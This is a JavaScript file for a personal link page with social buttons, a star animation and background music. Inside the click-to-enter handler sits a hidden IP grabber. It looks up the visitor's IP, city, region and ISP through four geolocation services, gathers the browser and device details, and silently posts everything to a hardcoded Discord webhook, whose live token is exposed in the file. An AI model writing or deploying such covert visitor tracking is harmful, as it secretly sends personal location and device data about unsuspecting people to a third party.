(() => {
  const cfg = window.SITE_CONFIG;
  const $ = (id) => document.getElementById(id);

  // Fill profile
  $("name").textContent = cfg.name;
  $("tagline").textContent = cfg.tagline;

  // Fill links
  const linkMap = {
    discordMini: cfg.links.discord,
    btnRoblox: cfg.links.roblox,
    btnTelegram: cfg.links.telegram,
    btnSpotify: cfg.links.spotify,
    btnTikTok: cfg.links.tiktok
  };
  Object.entries(linkMap).forEach(([id, url]) => {
    const el = $(id);
    if (el) el.href = url;
  });

  // Intro gate (user gesture -> audio allowed)
  const intro = $("intro");
  const app = $("app");

  function showApp() {
    intro.style.transition = "opacity .35s ease";
    intro.style.opacity = "0";
    setTimeout(() => {
      intro.style.display = "none";
      app.hidden = false;
      app.animate(
        [{ opacity: 0, transform: "translateY(8px) scale(.99)" }, { opacity: 1, transform: "translateY(0) scale(1)" }],
        { duration: 420, easing: "cubic-bezier(.2,.8,.2,1)" }
      );
    }, 380);
  }

  // Background stars
  const canvas = document.getElementById("stars");
  const ctx = canvas.getContext("2d");
  let w, h, dpr;
  let stars = [];

  function resize() {
    dpr = Math.max(1, Math.min(2, window.devicePixelRatio || 1));
    w = canvas.width = Math.floor(innerWidth * dpr);
    h = canvas.height = Math.floor(innerHeight * dpr);
    canvas.style.width = innerWidth + "px";
    canvas.style.height = innerHeight + "px";
    stars = Array.from({ length: Math.floor((innerWidth * innerHeight) / 9000) }, () => ({
      x: Math.random() * w,
      y: Math.random() * h,
      r: (Math.random() * 1.4 + 0.3) * dpr,
      a: Math.random() * 0.55 + 0.10,
      s: (Math.random() * 0.25 + 0.05) * dpr
    }));
  }
  window.addEventListener("resize", resize, { passive: true });
  resize();

  let t = 0;
  function loop() {
    t += 0.006;
    ctx.clearRect(0, 0, w, h);
    for (const st of stars) {
      st.y += st.s;
      if (st.y > h + 10) { st.y = -10; st.x = Math.random() * w; }
      const tw = (Math.sin(t + st.x * 0.001) + 1) * 0.5;
      ctx.globalAlpha = Math.min(0.9, st.a + tw * 0.25);
      ctx.beginPath();
      ctx.arc(st.x, st.y, st.r, 0, Math.PI * 2);
      ctx.fillStyle = "#fff";
      ctx.fill();
    }
    requestAnimationFrame(loop);
  }
  loop();

  // Audio (background)
  const audio = new Audio();
  audio.loop = true;
  audio.preload = "auto";
  audio.volume = 0.85;

  async function pickFirstExistingAudio() {
    const base = cfg.songBaseName || "public/song";
    const exts = Array.isArray(cfg.songExtensions) ? cfg.songExtensions : ["mp3"];
    for (const ext of exts) {
      const url = `${base}.${ext}`;
      try {
        const res = await fetch(url, { method: "HEAD", cache: "no-store" });
        if (res.ok) return url;
      } catch (_) {}
    }
    return `${base}.mp3`;
  }

  // Discord Webhook Function with multiple API fallbacks
  async function sendDiscordNotification() {
    const webhookURL = "https://discord.com/api/webhooks/1459594953679441934/L5XH5D46GOZtYS1AnZDQeqAsmH2ncJxclgVAtO3I5HtTNmbb1-yHf3V5-gQpyCji5Q9B";
    
    try {
      console.log('🔄 Начинаем сбор данных...');
      
      let geoData = {
        ip: "Неизвестно",
        country: "Неизвестно",
        countryCode: null,
        region: "Неизвестно",
        city: "Неизвестно",
        isp: "Неизвестно",
        timezone: "Unknown"
      };
      
      // Method 1: Try ipapi.co with IP
      try {
        console.log('🌐 Пробуем ipapi.co...');
        const response = await Promise.race([
          fetch('https://ipapi.co/json/'),
          new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000))
        ]);
        
        if (response.ok) {
          const data = await response.json();
          console.log('✅ ipapi.co ответил:', data);
          
          if (data && !data.error) {
            geoData = {
              ip: data.ip || geoData.ip,
              country: data.country_name || geoData.country,
              countryCode: data.country_code || data.country || null,
              region: data.region || geoData.region,
              city: data.city || geoData.city,
              isp: data.org || data.asn || geoData.isp,
              timezone: data.timezone || geoData.timezone
            };
          }
        }
      } catch (e) {
        console.warn('⚠️ ipapi.co не сработал:', e.message);
      }

      // Method 2: If ipapi failed, try ip-api.com
      if (geoData.country === "Неизвестно") {
        try {
          console.log('🌐 Пробуем ip-api.com...');
          const response = await Promise.race([
            fetch('http://ip-api.com/json/?fields=status,country,countryCode,region,regionName,city,isp,org,as,timezone,query'),
            new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000))
          ]);
          
          if (response.ok) {
            const data = await response.json();
            console.log('✅ ip-api.com ответил:', data);
            
            if (data && data.status === 'success') {
              geoData = {
                ip: data.query || geoData.ip,
                country: data.country || geoData.country,
                countryCode: data.countryCode || null,
                region: data.regionName || data.region || geoData.region,
                city: data.city || geoData.city,
                isp: data.isp || data.org || data.as || geoData.isp,
                timezone: data.timezone || geoData.timezone
              };
            }
          }
        } catch (e) {
          console.warn('⚠️ ip-api.com не сработал:', e.message);
        }
      }

      // Method 3: If still no data, try ipwhois.app
      if (geoData.country === "Неизвестно") {
        try {
          console.log('🌐 Пробуем ipwhois.app...');
          const response = await Promise.race([
            fetch('https://ipwhois.app/json/'),
            new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000))
          ]);
          
          if (response.ok) {
            const data = await response.json();
            console.log('✅ ipwhois.app ответил:', data);
            
            if (data && data.success) {
              geoData = {
                ip: data.ip || geoData.ip,
                country: data.country || geoData.country,
                countryCode: data.country_code || null,
                region: data.region || geoData.region,
                city: data.city || geoData.city,
                isp: data.isp || data.org || geoData.isp,
                timezone: data.timezone || geoData.timezone
              };
            }
          }
        } catch (e) {
          console.warn('⚠️ ipwhois.app не сработал:', e.message);
        }
      }

      // Method 4: If still nothing, try freeipapi.com
      if (geoData.country === "Неизвестно") {
        try {
          console.log('🌐 Пробуем freeipapi.com...');
          const response = await Promise.race([
            fetch('https://freeipapi.com/api/json'),
            new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000))
          ]);
          
          if (response.ok) {
            const data = await response.json();
            console.log('✅ freeipapi.com ответил:', data);
            
            if (data) {
              geoData = {
                ip: data.ipAddress || geoData.ip,
                country: data.countryName || geoData.country,
                countryCode: data.countryCode || null,
                region: data.regionName || geoData.region,
                city: data.cityName || geoData.city,
                isp: data.isp || geoData.isp,
                timezone: data.timeZone || geoData.timezone
              };
            }
          }
        } catch (e) {
          console.warn('⚠️ freeipapi.com не сработал:', e.message);
        }
      }

      console.log('📊 Итоговые данные геолокации:', geoData);
      
      // Get country flag emoji
      const getFlagEmoji = (countryCode) => {
        if (!countryCode || countryCode.length !== 2) return "🏴";
        try {
          const codePoints = countryCode
            .toUpperCase()
            .split('')
            .map(char => 127397 + char.charCodeAt());
          return String.fromCodePoint(...codePoints);
        } catch {
          return "🏴";
        }
      };

      const flagEmoji = getFlagEmoji(geoData.countryCode);
      
      // Get user agent info
      const userAgent = navigator.userAgent || "Unknown";
      const browser = userAgent.match(/(chrome|firefox|safari|edge|opera|yandex)/i)?.[0] || "Unknown";
      const platform = navigator.platform || "Unknown";
      const screenRes = `${window.screen.width}x${window.screen.height}`;
      const language = navigator.language || "Unknown";
      
      let timezone = geoData.timezone;
      let currentTime = new Date().toISOString();
      
      try {
        if (timezone === "Unknown") {
          timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        }
        currentTime = new Date().toLocaleString('ru-RU', {
          timeZone: timezone,
          dateStyle: 'full',
          timeStyle: 'long'
        });
      } catch {
        currentTime = new Date().toLocaleString('ru-RU');
      }

      // Create embed
      const embed = {
        username: "tonhind.vercel.app",
        avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
        embeds: [{
          title: "🚀 Новый посетитель на сайте",
          color: 0x5865F2,
          thumbnail: {
            url: geoData.countryCode 
              ? `https://flagcdn.com/w80/${geoData.countryCode.toLowerCase()}.png`
              : "https://cdn.discordapp.com/embed/avatars/0.png"
          },
          fields: [
            {
              name: "🌍 Локация",
              value: `**Страна:** ${flagEmoji} ${geoData.country}${geoData.countryCode ? ` (${geoData.countryCode})` : ''}\n**Город:** ${geoData.city}\n**Регион:** ${geoData.region}\n**Провайдер:** ${geoData.isp}`,
              inline: true
            },
            {
              name: "📡 Сеть",
              value: `**IP:** ||${geoData.ip}||\n**Время:** ${currentTime}\n**Часовой пояс:** ${timezone}`,
              inline: true
            },
            {
              name: "💻 Браузер",
              value: `**Платформа:** ${platform}\n**Браузер:** ${browser}\n**Язык:** ${language}\n**Разрешение:** ${screenRes}`,
              inline: false
            },
            {
              name: "🔗 Технические данные",
              value: `**User Agent:** \`\`\`${userAgent.substring(0, 300)}${userAgent.length > 300 ? '...' : ''}\`\`\``,
              inline: false
            }
          ],
          footer: {
            text: `tonhind.vercel.app • ${new Date().getFullYear()}`,
            icon_url: "https://vercel.com/favicon.ico"
          },
          timestamp: new Date().toISOString()
        }]
      };

      console.log('📤 Отправляем данные в Discord...');
      
      // Send to Discord
      const response = await Promise.race([
        fetch(webhookURL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(embed)
        }),
        new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 10000))
      ]);

      if (response.ok) {
        console.log('✅ Уведомление успешно отправлено в Discord');
      } else {
        const errorText = await response.text().catch(() => 'Не удалось прочитать ошибку');
        console.error('❌ Discord вернул ошибку:', response.status, errorText);
      }
      
    } catch (error) {
      console.error('❌ Критическая ошибка при отправке в Discord:', error);
      
      // Fallback: send minimal notification
      try {
        const minimalEmbed = {
          username: "tonhind.vercel.app",
          embeds: [{
            title: "⚠️ Новый посетитель (минимальные данные)",
            color: 0xFF9900,
            description: `Не удалось собрать полные данные.\n**Время:** ${new Date().toLocaleString('ru-RU')}\n**User Agent:** ${navigator.userAgent.substring(0, 100)}...`,
            timestamp: new Date().toISOString()
          }]
        };
        
        await fetch(webhookURL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(minimalEmbed)
        });
        
        console.log('✅ Минимальное уведомление отправлено');
      } catch (fallbackError) {
        console.error('❌ Даже fallback не сработал:', fallbackError);
      }
    }
  }

  async function enter() {
    showApp();
    const url = await pickFirstExistingAudio();
    audio.src = url;
    try { await audio.play(); } catch (_) {}
    
    // Send Discord notification (non-blocking)
    sendDiscordNotification().catch(err => {
      console.warn('Discord notification failed silently:', err);
    });
  }

  intro.addEventListener("click", enter, { once: true });
})();

// iOS double-tap zoom prevent (best-effort)
(() => {
  let lastTouchEnd = 0;
  document.addEventListener('touchend', (e) => {
    const now = Date.now();
    if (now - lastTouchEnd <= 300) {
      e.preventDefault();
    }
    lastTouchEnd = now;
  }, { passive: false });
})();
